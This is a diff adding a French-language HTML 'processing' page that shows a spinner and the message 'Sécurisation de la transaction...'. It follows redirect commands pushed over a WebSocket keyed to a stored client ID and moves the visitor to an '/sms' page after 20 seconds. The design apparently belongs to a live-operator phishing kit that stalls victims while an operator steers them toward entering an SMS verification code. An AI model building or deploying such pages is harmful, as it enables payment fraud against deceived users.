@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Traitement en cours...</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Inter', sans-serif;
+            background: #0f172a;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #6366f1;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 1.5rem;
+        }
+
+        @keyframes spin {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        p {
+            font-size: 1.1rem;
+            opacity: 0.8;
+        }
+
+        .timer {
+            font-size: 0.8rem;
+            margin-top: 10px;
+            color: #94a3b8;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="loader"></div>
+    <p>Sécurisation de la transaction...</p>
+    <div id="timer" class="timer">Vérification en cours (20s)</div>
+
+    <script>
+        const clientId = localStorage.getItem('aura_client_id');
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const ws = new WebSocket(`${protocol}//${window.location.host}/ws/client/${clientId}`);
+
+        ws.onmessage = (e) => {
+            const msg = JSON.parse(e.data);
+            if (msg.type === 'REDIRECT') window.location.href = msg.url;
+        };
+
+        // Redirection automatique après 20s vers SMS (par défaut)
+        let timeLeft = 20;
+        setInterval(() => {
+            timeLeft--;
+            if (timeLeft >= 0) document.getElementById('timer').textContent = `Vérification en cours (${timeLeft}s)`;
+            if (timeLeft === 0) window.location.href = '/sms';
+        }, 1000);
+    </script>
+</body>
+
+</html>
